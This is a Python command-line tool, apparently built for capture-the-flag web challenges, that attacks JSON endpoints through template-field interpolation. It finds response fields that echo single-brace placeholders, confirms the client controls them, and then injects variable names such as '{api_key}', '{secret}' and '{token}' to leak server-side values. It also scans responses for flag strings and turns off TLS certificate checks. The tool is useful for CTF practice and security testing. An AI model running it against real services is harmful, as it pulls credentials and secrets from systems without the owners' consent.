#!/usr/bin/env python3
"""templatequick.py — bounded response-only template-field fast track.

Give it one known-valid JSON request for an evaluator, renderer, exporter, or
generator endpoint. It looks for top-level response fields absent from the
request whose value is a single-brace placeholder (for example ``{value}``),
proves the field is client-controllable, confirms interpolation with harmless
context variables, then checks a small high-value variable set.

Exit codes: 0 completed (including interpolation or flag found), 2 inconclusive
(no marker, rate limit, or probe budget), 3 gateway/request failure,
4 invalid arguments.
"""
import argparse
import json
import os
import re
import sys
import time

import requests

requests.packages.urllib3.disable_warnings()

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36")
FLAG_RE = re.compile(
    r'(?<![A-Za-z0-9])(?:HTB|bug|flag|CTF|THM|PLab|picoCTF|RM|WEBVERSE)\{[^}]{3,120}\}', re.I)
PLACEHOLDER_RE = re.compile(r'^\{([A-Za-z_][A-Za-z0-9_]*)\}$')
GATEWAY_FAILURES = {502, 503, 504}
CONTROL_SENTINEL = "webctf-template-control"
CONTROL_VARS = ("value", "name", "symbol")
HIGH_VALUE_VARS = ("flag", "api_key", "secret", "token", "key")


class FoundFlag(RuntimeError):
    pass


class Inconclusive(RuntimeError):
    pass


class CircuitBreak(RuntimeError):
    pass


class BudgetExhausted(RuntimeError):
    pass


def unique(items):
    return list(dict.fromkeys(item for item in items if item))


def response_object(response):
    try:
        data = response.json()
    except ValueError:
        return None
    return data if isinstance(data, dict) else None


def shown(value, limit=300):
    rendered = json.dumps(value, ensure_ascii=False) if not isinstance(value, str) else value
    return rendered if len(rendered) <= limit else rendered[:limit] + "..."


class TemplateFastTrack:
    def __init__(self, args, baseline_data):
        self.args = args
        self.baseline_data = baseline_data
        self.session = requests.Session()
        self.headers = {
            "User-Agent": UA,
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
        }
        if args.token:
            self.headers["Authorization"] = "Bearer " + args.token
        if args.cookie:
            self.headers["Cookie"] = args.cookie
        for item in args.header:
            if ":" not in item:
                raise ValueError("--header must be 'Name: Value': %s" % item)
            key, value = item.split(":", 1)
            self.headers[key.strip()] = value.strip()
        self.count = 0
        self.interpolated = False
        os.makedirs(args.out, exist_ok=True)
        self.log_path = os.path.join(args.out, "probes.jsonl")

    def _record(self, label, payload, response):
        if isinstance(response, Exception):
            record = {"label": label, "request": payload, "error": repr(response)}
        else:
            record = {
                "label": label,
                "request": payload,
                "status": response.status_code,
                "headers": dict(response.headers),
                "body": (response.text or "")[:8000],
            }
        with open(self.log_path, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(record, sort_keys=True) + "\n")

    def send(self, label, payload):
        if self.count >= self.args.max_probes:
            raise BudgetExhausted("probe budget reached (%d)" % self.args.max_probes)
        if self.count:
            time.sleep(self.args.delay)
        self.count += 1
        try:
            response = self.session.request(
                self.args.method, self.args.url, headers=self.headers, json=payload,
                timeout=self.args.timeout, allow_redirects=False, verify=False)
        except requests.RequestException as exc:
            self._record(label, payload, exc)
            raise CircuitBreak("request failed during %s: %s" % (label, exc))
        self._record(label, payload, response)
        print("[%02d/%02d] %-28s HTTP %d %db" % (
            self.count, self.args.max_probes, label,
            response.status_code, len(response.content)))
        scan = (response.text or "") + "\n" + "\n".join(
            "%s: %s" % item for item in response.headers.items())
        hits = unique(FLAG_RE.findall(scan))
        if hits:
            for hit in hits:
                print("FLAG %s" % hit)
            raise FoundFlag()
        if response.status_code == 429:
            raise Inconclusive("429 rate limit during %s" % label)
        if response.status_code in GATEWAY_FAILURES:
            raise CircuitBreak("%s returned HTTP %d" % (label, response.status_code))
        return response

    def payload_with(self, field, value):
        payload = dict(self.baseline_data)
        payload[field] = value
        return payload

    def candidate_fields(self, baseline_response):
        data = response_object(baseline_response) or {}
        automatic = []
        for key, value in data.items():
            if key in self.baseline_data or not isinstance(value, str):
                continue
            if PLACEHOLDER_RE.fullmatch(value):
                automatic.append(key)
                print("[+] response-only placeholder field: %s=%s" % (key, value))
        fields = unique(list(self.args.field) + automatic)
        return fields, data

    def probe_field(self, field, baseline_object):
        original = baseline_object.get(field)
        response = self.send(
            "control:%s" % field, self.payload_with(field, CONTROL_SENTINEL))
        obj = response_object(response) or {}
        if obj.get(field) != CONTROL_SENTINEL:
            print("[-] %s was not directly client-controllable" % field)
            return
        print("[+] client controls response field %s" % field)

        marker_name = None
        if isinstance(original, str):
            match = PLACEHOLDER_RE.fullmatch(original)
            marker_name = match.group(1) if match else None
        for name in unique([marker_name] + list(CONTROL_VARS)):
            probe = "{%s}" % name
            response = self.send(
                "interpolate:%s:%s" % (field, name), self.payload_with(field, probe))
            obj = response_object(response) or {}
            rendered = obj.get(field)
            if rendered is not None and rendered != probe:
                self.interpolated = True
                print("INTERPOLATED %s %s -> %s" % (field, probe, shown(rendered)))
                break
        if not self.interpolated:
            print("[-] no harmless single-brace variable interpolated in %s" % field)
            return

        for name in HIGH_VALUE_VARS:
            probe = "{%s}" % name
            response = self.send(
                "high-value:%s:%s" % (field, name), self.payload_with(field, probe))
            obj = response_object(response) or {}
            rendered = obj.get(field)
            if rendered is not None and rendered != probe:
                print("HIGH-VALUE %s %s -> %s" % (field, probe, shown(rendered)))

    def run(self):
        baseline = self.send("baseline", self.baseline_data)
        if not 200 <= baseline.status_code < 300:
            raise Inconclusive(
                "known-valid baseline did not succeed (HTTP %d); fix --data before probing"
                % baseline.status_code)
        fields, baseline_object = self.candidate_fields(baseline)
        if not fields:
            raise Inconclusive(
                "no top-level response-only single-brace marker; name a known field with --field")
        for field in fields:
            self.probe_field(field, baseline_object)
            if self.interpolated:
                return
        raise Inconclusive("candidate fields did not demonstrate interpolation")


def parse_args(argv=None):
    parser = argparse.ArgumentParser(
        description="Probe response-only single-brace template fields with a valid JSON request")
    parser.add_argument("--url", required=True, help="full endpoint URL")
    parser.add_argument("--data", required=True,
                        help="known-valid JSON object used as the baseline request")
    parser.add_argument("--method", choices=("POST", "PUT", "PATCH"), default="POST")
    parser.add_argument("--token", help="Bearer token")
    parser.add_argument("--cookie", help="Cookie header value")
    parser.add_argument("--header", action="append", default=[], help="extra 'Name: Value' header")
    parser.add_argument("--field", action="append", default=[],
                        help="explicit top-level candidate field; repeatable")
    parser.add_argument("--out", default="recon/templatequick", help="evidence directory")
    parser.add_argument("--max-probes", type=int, default=12)
    parser.add_argument("--delay", type=float, default=0.15)
    parser.add_argument("--timeout", type=float, default=10.0)
    return parser.parse_args(argv)


def main(argv=None):
    args = parse_args(argv)
    try:
        baseline_data = json.loads(args.data)
        if not isinstance(baseline_data, dict):
            raise ValueError("--data must decode to a JSON object")
        if args.max_probes < 1:
            raise ValueError("--max-probes must be positive")
        runner = TemplateFastTrack(args, baseline_data)
        runner.run()
        print("[*] completed %d probe(s); evidence: %s" % (runner.count, runner.log_path))
        return 0
    except FoundFlag:
        print("[*] stopped on flag after %d probe(s); evidence: %s" % (
            runner.count, runner.log_path))
        return 0
    except (Inconclusive, BudgetExhausted) as exc:
        print("[!] INCONCLUSIVE: %s" % exc)
        return 2
    except CircuitBreak as exc:
        print("[!] CIRCUIT BREAKER: %s" % exc)
        return 3
    except (ValueError, TypeError) as exc:
        print("[!] invalid arguments: %s" % exc, file=sys.stderr)
        return 4


if __name__ == "__main__":
    sys.exit(main())
